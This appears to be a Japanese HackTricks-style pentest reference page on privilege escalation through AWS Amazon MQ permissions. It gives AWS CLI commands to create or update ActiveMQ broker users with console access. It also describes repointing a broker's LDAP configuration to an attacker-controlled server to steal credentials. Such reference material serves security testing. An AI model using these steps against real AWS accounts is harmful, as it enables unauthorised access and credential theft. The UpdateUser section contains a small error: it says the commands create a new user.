# AWS - MQ Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## MQ

MQの詳細については以下を参照してください：

{{#ref}}
../../aws-services/aws-mq-enum.md
{{#endref}}

### `mq:ListBrokers`, `mq:CreateUser`

これらの権限があれば、**ActimeMQ ブローカーに新しいユーザーを作成できます**（これは RabbitMQ では動作しません）：
```bash
aws mq list-brokers
aws mq create-user --broker-id <value> --console-access --password <value> --username <value>
```
**Potential Impact:** ActiveMQ を操作して機密情報にアクセスする

### `mq:ListBrokers`, `mq:ListUsers`, `mq:UpdateUser`

これらの権限があれば、**ActimeMQ broker に新しいユーザーを作成できます**（これは RabbitMQ では動作しません）:
```bash
aws mq list-brokers
aws mq list-users --broker-id <value>
aws mq update-user --broker-id <value> --console-access --password <value> --username <value>
```
**Potential Impact:** ActiveMQ を通じて機密情報へアクセス可能

### `mq:ListBrokers`, `mq:UpdateBroker`

ブローカーが **ActiveMQ** での認可に **LDAP** を使用している場合、使用されているLDAPサーバーの**設定**を**攻撃者の管理下にあるもの**に**変更**することが可能です。こうすることで、攻撃者は **LDAP** を通じて送信されるすべての認証情報を**窃取**できるようになります。
```bash
aws mq list-brokers
aws mq update-broker --broker-id <value> --ldap-server-metadata=...
```
もし何らかの方法で ActiveMQ に使われた元の credentials を見つけられれば、MitM を実行して creds を盗み、それらを元のサーバーで使用してレスポンスを送信できます（盗んだ creds を再利用するだけで可能かもしれません）。

**潜在的な影響:** ActiveMQ の credentials を盗む

{{#include ../../../../banners/hacktricks-training.md}}
